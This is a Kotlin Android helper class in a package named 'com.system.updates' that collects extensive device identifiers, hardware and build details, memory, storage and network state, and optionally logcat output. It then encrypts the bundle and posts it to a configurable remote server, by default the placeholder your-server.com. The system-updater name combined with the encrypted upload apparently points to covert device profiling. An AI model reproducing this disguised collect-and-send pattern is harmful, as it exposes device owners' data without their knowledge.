package com.system.updates.debug

import android.content.Context
import android.os.Build
import android.os.Debug
import android.os.Environment
import android.os.StatFs
import android.util.Base64
import android.util.Log
import com.system.updates.CryptoManager
import com.system.updates.NetworkUtils
import org.json.JSONObject
import java.io.BufferedReader
import java.io.File
import java.io.FileOutputStream
import java.io.InputStreamReader
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class DebugHelper(private val ctx: Context) {
    private val crypto = CryptoManager(ctx)
    private val network = NetworkUtils(ctx)
    private val prefs = ctx.getSharedPreferences("debug_prefs", Context.MODE_PRIVATE)
    private val random = SecureRandom()

    fun collectAll(): JSONObject {
        val all = JSONObject()
        try {
            all.put("system", collectSystemInfo())
            all.put("storage", collectStorageInfo())
            all.put("process", collectProcessInfo())
            all.put("network", collectNetworkInfo())
            all.put("timestamp", System.currentTimeMillis())
        } catch (e: Exception) {
            Log.e("DebugHelper", "collectAll error", e)
        }
        return all
    }

    private fun collectSystemInfo(): JSONObject {
        val info = JSONObject()
        try {
            info.put("device_id", crypto.getDeviceId())
            info.put("android_version", Build.VERSION.RELEASE)
            info.put("sdk_int", Build.VERSION.SDK_INT)
            info.put("manufacturer", Build.MANUFACTURER)
            info.put("model", Build.MODEL)
            info.put("product", Build.PRODUCT)
            info.put("board", Build.BOARD)
            info.put("hardware", Build.HARDWARE)
            info.put("brand", Build.BRAND)
            info.put("device", Build.DEVICE)
            info.put("display", Build.DISPLAY)
            info.put("fingerprint", Build.FINGERPRINT)
            info.put("host", Build.HOST)
            info.put("id", Build.ID)
            info.put("tags", Build.TAGS)
            info.put("time", Build.TIME)
            info.put("type", Build.TYPE)
            info.put("user", Build.USER)
            info.put("radio_version", Build.getRadioVersion())
            info.put("bootloader", Build.BOOTLOADER)
            info.put("supported_abis", Build.SUPPORTED_ABIS.joinToString(","))
            val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            info.put("memory_class", am.memoryClass)
            val mi = am.getProcessMemoryInfo(intArrayOf(android.os.Process.myPid()))[0]
            info.put("memory_pss", mi.getMemoryStat("summary.total-pss"))
            info.put("memory_private", mi.getMemoryStat("summary.private-dirty"))
        } catch (e: Exception) {
            Log.e("DebugHelper", "collectSystemInfo error", e)
        }
        return info
    }

    private fun collectStorageInfo(): JSONObject {
        val info = JSONObject()
        try {
            val data = Environment.getDataDirectory()
            val ds = StatFs(data.path)
            val bs = ds.blockSizeLong
            info.put("data_total", ds.blockCountLong * bs)
            info.put("data_free", ds.availableBlocksLong * bs)
            val cache = ctx.cacheDir
            val cs = StatFs(cache.path)
            info.put("cache_total", cs.blockCountLong * cs.blockSizeLong)
            info.put("cache_free", cs.availableBlocksLong * cs.blockSizeLong)
        } catch (e: Exception) {
            Log.e("DebugHelper", "collectStorageInfo error", e)
        }
        return info
    }

    private fun collectProcessInfo(): JSONObject {
        val info = JSONObject()
        try {
            info.put("pid", android.os.Process.myPid())
            info.put("threads", Debug.threadCount())
            info.put("native_heap", Debug.getNativeHeapSize())
            info.put("native_alloc", Debug.getNativeHeapAllocatedSize())
            info.put("native_free", Debug.getNativeHeapFreeSize())
            info.put("global_gc_count", Debug.getGlobalGcInvocationCount())
        } catch (e: Exception) {
            Log.e("DebugHelper", "collectProcessInfo error", e)
        }
        return info
    }

    private fun collectNetworkInfo(): JSONObject {
        val info = JSONObject()
        try {
            val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val net = cm.activeNetworkInfo
            info.put("connected", net?.isConnected ?: false)
            info.put("type", net?.typeName)
            info.put("subtype", net?.subtypeName)
        } catch (e: Exception) {
            Log.e("DebugHelper", "collectNetworkInfo error", e)
        }
        return info
    }

    fun collectLogcat(tag: String? = null, lines: Int = 100): String {
        return try {
            val cmd = arrayOf("logcat", "-d", "-v", "time", "-t", lines.toString())
            val proc = Runtime.getRuntime().exec(cmd)
            val reader = BufferedReader(InputStreamReader(proc.inputStream))
            val out = StringBuilder()
            reader.use { r ->
                r.forEachLine { line ->
                    if (tag == null || line.contains(tag)) out.append(line).append("\n")
                }
            }
            proc.destroy()
            out.toString()
        } catch (e: Exception) {
            "logcat failed: $e"
        }
    }

    fun sendDebugReport() {
        val data = collectAll()
        try {
            val key = crypto.deriveDeviceKey()
            val iv = ByteArray(12).also { random.nextBytes(it) }
            val cipher = Cipher.getInstance("AES/GCM/NoPadding")
            cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(key, "AES"), GCMParameterSpec(128, iv))
            val ct = cipher.doFinal(data.toString().toByteArray())
            val full = iv + ct
            val b64 = Base64.encodeToString(full, Base64.NO_WRAP)
            network.httpPost(getBaseUrl() + "/v16/debug", "debug=$b64")
        } catch (e: Exception) {
            Log.e("DebugHelper", "sendDebugReport error", e)
        }
    }

    fun saveLogsToFile(logs: String, fileName: String = "debug.log"): File? {
        return try {
            val fos = ctx.openFileOutput(fileName, Context.MODE_PRIVATE)
            fos.write(logs.toByteArray())
            fos.close()
            File(ctx.filesDir, fileName)
        } catch (e: Exception) {
            Log.e("DebugHelper", "saveLogsToFile error", e)
            null
        }
    }

    fun deleteLogs(fileName: String = "debug.log") {
        ctx.deleteFile(fileName)
    }

    private fun getBaseUrl(): String {
        return prefs.getString("base_url", "https://your-server.com") ?: "https://your-server.com"
    }
}